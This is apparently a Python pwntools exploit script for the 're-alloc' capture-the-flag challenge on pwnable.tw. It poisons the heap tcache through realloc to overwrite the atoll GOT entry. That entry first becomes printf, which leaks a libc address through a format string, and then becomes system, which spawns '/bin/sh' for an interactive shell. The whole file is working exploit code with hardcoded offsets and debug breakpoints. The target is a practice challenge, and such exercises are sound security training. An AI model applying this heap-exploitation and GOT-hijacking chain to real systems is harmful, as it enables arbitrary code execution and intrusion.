

from pwn import *
import pdb
import sys
from enum import Enum

class CHOICE(Enum):
  ALLOC = 1
  REALLOC = 2
  FREE = 3


def choice(idx):
  if isinstance(idx, Enum):
    p.sendlineafter('Your choice: ', str(idx.value))
  else:
    p.sendlineafter('Your choice: ', str(idx))

def alloc(idx, sz, cont):
  choice(CHOICE.ALLOC)
  p.sendlineafter('Index:', str(idx))
  p.sendlineafter('Size:', str(sz))
  p.sendlineafter('Data:', cont)

def realloc(idx, sz, cont=None):
  choice(CHOICE.REALLOC)
  p.sendlineafter('Index:', str(idx))
  p.sendlineafter('Size:', str(sz))
  if cont:
    p.sendlineafter('Data:', cont)

def free(idx):
  choice(CHOICE.FREE)
  p.sendlineafter('Index:', str(idx))

def leak_libc(offset = 0):
  choice(CHOICE.ALLOC)
  if offset <= 0 or offset > 16:
    p.sendlineafter('Index:', '%p')
  else:
    count = offset - 1
    p.sendlineafter('Index:', '%d' * count + '%p')

  p.recvuntil('0x', drop=True)
  cont = '0x'+p.recvline()

  addr = int(cont, 16)
  return addr

def trigger():
  p.sendlineafter('Your choice: ', '1')
  p.sendlineafter('Index:', '/bin/sh\x00')

DEBUG = False

p = process('/home/len/pwnable/re-alloc')
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')


if not DEBUG:  
  p = remote('chall.pwnable.tw', 10106)
  elf = ELF('/home/len/pwnable/libc.so.6')  
  

context.log_level = 'debug'
atoll_got = 0x404048
printf_plt = 0x401070
libc_offset = 0x12e009
system_offset = elf.symbols['system']


if __name__ == "__main__":
  pdb.set_trace()

  alloc(0, 0x8, p64(atoll_got))
  realloc(0, 0)  
  realloc(0, 0x18, p64(atoll_got))
  alloc(1, 0x8, p64(atoll_got))

  realloc(0, 0x28, p64(atoll_got))
  free(0)
  realloc(1, 0x28, p64(atoll_got))
  free(1)

  alloc(0, 0x38, p64(atoll_got))
  realloc(0, 0)  
  realloc(0, 0x38, p64(atoll_got))
  alloc(1, 0x38, p64(atoll_got))

  realloc(0, 0x48, p64(atoll_got))
  free(0)
  realloc(1, 0x48, p64(atoll_got))
  free(1)

  pdb.set_trace()
  alloc(0, 0x38, p64(printf_plt))

  addr = leak_libc(3)
  print('addr: {:#x}'.format(addr))
  # libc_base = p.libc.address
  # print('libc_base: {:#x}'.format(libc_base))

  libc_base = addr - libc_offset
  print('libc_base: {:#x}'.format(libc_base))

  system_addr = libc_base + system_offset
  print('system_addr: {:#x}'.format(system_addr))

  # pdb.set_trace()
  choice(1)
  p.sendlineafter('Index:', '1\x00')
  p.sendlineafter('Size:', 'a'*8+'\x00')
  p.sendlineafter('Data:', p64(system_addr))
  

  trigger()

  # p.sendlineafter('Index:', 'a')
  # realloc(0, 0x8, p64(system_addr))
  # p.sendlineafter
  
  p.interactive()